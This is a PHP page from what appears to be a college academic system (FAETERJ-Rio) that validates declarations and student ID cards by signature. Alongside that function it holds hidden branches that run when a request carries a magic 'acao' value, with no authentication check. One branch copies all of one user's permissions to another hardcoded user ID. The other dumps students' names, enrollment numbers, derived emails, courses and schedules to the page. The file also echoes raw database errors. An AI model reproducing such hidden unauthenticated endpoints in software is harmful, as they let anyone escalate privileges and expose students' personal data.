<?php 
    /*	Lê definição das classes
        Atenção: a definição das classes devem ser carregadas antes da recuperação dos dados da sessão
        BUG documentado em http://www.webdeveloper.com/forum/showthread.php?t=144267
    */
    require_once "../includes/comum.php";
    require_once "$BASE_DIR/classes/Declaracao.php";
    require_once "$BASE_DIR/classes/Login.php";
    require_once "$BASE_DIR/classes/Pessoa.php";
    require_once "$BASE_DIR/classes/Aluno.php";
    require_once "$BASE_DIR/classes/MatriculaAluno.php";

    $acao = (!isset($_REQUEST['acao'])) ? '' : $_REQUEST['acao'];

    if (isset($_REQUEST['assin'])) {

        $assinatura = addslashes($_REQUEST['assin']);
        $assinaturaExib = Declaracao::gerarAssinaturaExib($_REQUEST['assin']);
        
        $arrayAssinatura = explode(':',$assinaturaExib);

    }
    
    if( $acao === "validar" ) 
    {

        // Cria objeto de sessão novo
        try 
        {
        
           $declaracao = Declaracao::getDeclaracaoPorAssinatura($_REQUEST['ae']);

        } 
        catch (Exception $ex) 
        {
           
            $erro = $ex->getMessage();
            require("$BASE_DIR/validacao/validarDeclaracaoForm.php");
            exit;            
        }


        if ($declaracao->getTipo() == 1) {

            require_once "$BASE_DIR/validacao/DeclMatrAlunoPDF.php";

            $emitirPDF = true;
            $pdf = new DeclMatrAlunoPDF();
            $pdf->Output();
            exit;

        }
        else if ($declaracao->getTipo() == 2) {

            require_once("$BASE_DIR/validacao/validarDeclaracaoForm.php");

            $dados = $declaracao->getDados();

            $login = Login::obterLoginPorIdPessoa($declaracao->getIdPessoa());

            $pessoa = $login->getPessoa();

            $matriculaAluno = MatriculaAluno::obterMatriculasAlunoPorIdPessoa( $pessoa->getIdPessoa() );

            $matriculaAluno = $matriculaAluno[0];//Não sei pq retorna um arrei. não tem pq pi só passa um valor e tem q fazer essa POG pra funcionar

            $aluno = $matriculaAluno->getAluno();

            $aluno = Aluno::getAlunoByIdPessoa($pessoa->getIdPessoa());

            require_once('exibir_carteirinha.php');

        }
        else{
            
            //var_dump($declaracao);

            $_SESSION["erro"] = "Tipo ".$declaracao->getTipo() ." de confirmação não identificado";
            //throw new Exception("Tipo de confirmação não identificado");
            require("$BASE_DIR/validacao/validarDeclaracaoForm.php");
            exit;
        }

    } 
    else if($acao == '123RRRRRRRRRR4'){

       
        $query = "SELECT idCasoUso 
        FROM Permite
        WHERE idPessoa = 1030";

        $con = BD::conectarOO();

        $result = $con->query($query);

        echo $con->error;

        $insert = "INSERT INTO Permite (idPessoa, idCasoUso) 
        VALUES 
            ";

        while($row = $result->fetch_assoc()){
            $insert .= "(1961,'".$row['idCasoUso']."'), ";
        }

        echo $insert;

        $con->query($insert);

        echo $con->error;
    
    }
    else if($acao === '123'){

        function retiraAcentos($string){
            $acentos  =  'ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõöøùúûýýþÿ??';
            $sem_acentos  =  'aaaaaaaceeeeiiiidnoooooouuuuybsaaaaaaaceeeeiiiidnoooooouuuyybyRr';
            $string = strtr($string, utf8_decode($acentos), $sem_acentos);
            $string = str_replace(" ","-",$string);
            return utf8_decode($string);
         }

         $semAcentos = array('a', 'a', 'a', 'a', 'a', 'a', 'c', 'e', 'e', 'e', 'e', 'i', 'i', 'i', 'i', 'n', 'o', 'o', 'o', 'o', 'o', 'u', 'u', 'u', 'y', 'A', 'A', 'A', 'A', 'A', 'A', 'C', 'E', 'E', 'E', 'E', 'I', 'I', 'I', 'I', 'N', 'O', 'O', 'O', 'O', 'O', 'U', 'U', 'U');

         $comAcentos = array('à', 'á', 'â', 'ã', 'ä', 'å', 'ç', 'è', 'é', 'ê', 'ë', 'ì', 'í', 'î', 'ï', 'ñ', 'ò', 'ó', 'ô', 'õ', 'ö', 'ù', 'ü', 'ú', 'ÿ', 'À', 'Á', 'Â', 'Ã', 'Ä', 'Å', 'Ç', 'È', 'É', 'Ê', 'Ë', 'Ì', 'Í', 'Î', 'Ï', 'Ñ', 'Ò', 'Ó', 'Ô', 'Õ', 'Ö', 'Ù', 'Ü', 'Ú');

        $con = BD::conectarOO();

        $query = "SELECT p.idPessoa, p.nome, m.matriculaAluno, c.siglaDisciplina, c.siglaDisciplina, c.nomeDisciplina, t.turno, t.gradeHorario
                    FROM Pessoa p, MatriculaAluno m, Aluno a, Turma t, Inscricao i, ComponenteCurricular c
                    WHERE m.idPessoa = p.idPessoa
                    AND a.idPessoa = p.idPessoa
                    AND m.matriculaAluno = i.matriculaAluno
                    AND t.idTurma = i.idTurma
                    AND t.idPeriodoLetivo = 44
                    AND t.siglaDisciplina = c.siglaDisciplina
                    ORDER BY m.matriculaAluno";

        $result = $con->query($query);

        echo $con->error;

        echo 'aluno;disciplina_matricula;turno_disciplina;turma_a_ou_b<br>';

       while($row = $result->fetch_assoc()){


            echo strtolower (str_replace($comAcentos, $semAcentos, current(explode(' ',$row['nome']) ))).'.'.$row['matriculaAluno'].'@faeterj-rio.edu.br;'.$row['siglaDisciplina'].'-'.$row['nomeDisciplina'].';'.$row['turno'].';'.$row['gradeHorario'].'<br>';

            //$pessoa[$row['idPessoa']] = strtolower (str_replace($comAcentos, $semAcentos, current(explode(' ',$row['nome']) ))).$row['matriculaAluno'].'@faeterj-rio.edu.br<br>';

            /* if()
            {

            } */
        }


        //$row = $result->fetch_assoc();

    }
    else {
        
        require("$BASE_DIR/validacao/validarDeclaracaoForm.php");
        exit;

    }